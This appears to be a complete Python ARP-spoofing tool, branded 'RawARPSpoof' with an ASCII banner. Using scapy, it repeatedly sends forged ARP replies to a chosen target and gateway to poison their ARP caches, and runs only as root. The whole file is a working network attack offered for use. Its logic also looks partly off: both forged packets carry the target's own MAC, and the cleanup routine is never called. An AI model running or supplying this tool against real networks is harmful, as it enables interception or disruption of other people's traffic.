import scapy.all as scapy
import time
import argparse
import os
import getpass


def banner():
    ban = '''

╔═══╗───────────╔═══╦═══╦═══╦═══╗─────────╔═╗
║╔═╗║───────────║╔═╗║╔═╗║╔═╗║╔═╗║─────────║╔╝
║╚═╝╠══╦╗╔╦══╦═╗║║─║║╚═╝║╚═╝║╚══╦══╦══╦══╦╝╚╗
║╔╗╔╣╔╗║╚╝║║═╣╔╗╣╚═╝║╔╗╔╣╔══╩══╗║╔╗║╔╗║╔╗╠╗╔╝
║║║╚╣╔╗╠╗╔╣║═╣║║║╔═╗║║║╚╣║──║╚═╝║╚╝║╚╝║╚╝║║║
╚╝╚═╩╝╚╝╚╝╚══╩╝╚╩╝─╚╩╝╚═╩╝──╚═══╣╔═╩══╩══╝╚╝
────────────────────────────────║║
────────────────────────────────╚╝

Author: Nitin Choudhury
Version: 0.1.0
    '''

    print(ban)



def getMAC(IP):
    ip = scapy.ARP(pdst=IP)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast/ip

    answered = scapy.srp(packet,
                         timeout=5,
                         verbose=False)[0]

    response_tbl = {}
    for a in answered:
        response_tbl[a[1].psrc]= a[1].src

    return response_tbl[IP]


def spoofARP(target_ip, gateway):
    spoof_pkt_1 = scapy.ARP(op=2,
                          psrc=target_ip,
                          pdst=gateway,
                          hwsrc=getMAC(target_ip))  # op=1 >> WHO HAS || op=2 >> IS AT

    spoof_pkt_2 = scapy.ARP(op=2,
                          psrc=gateway,
                          pdst=target_ip,
                          hwsrc=getMAC(target_ip))  # op=1 >> WHO HAS || op=2 >> IS AT

    scapy.send(spoof_pkt_1, verbose=False)
    scapy.send(spoof_pkt_2, verbose=False)

    return


def resetARP(target_ip, gateway):
    reset_pkt = scapy.ARP(op=2,
                          psrc=gateway,
                          pdst=target_ip,
                          hwsrc=getMAC(gateway),
                          hwdst=getMAC(target_ip))

    scapy.send(reset_pkt, verbose=False, count=2)

    return






if __name__ == '__main__':

    banner()
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-t", "--target",
        help="TARGET IP",
        required=True,
        type=str
    )

    parser.add_argument(
        "-g", "--gateway",
        help="GATEWAY IP",
        required=True,
        type=str
    )

    args = parser.parse_args()

    target_ip = args.target
    gateway = args.gateway

    if os.name=="posix":
        if getpass.getuser().lower()=="root":
            try:
                while True:
                    spoofARP(target_ip=target_ip, gateway=gateway)
                    time.sleep(1)

            except KeyboardInterrupt:
                print("\n[+] Stopped")
                pass
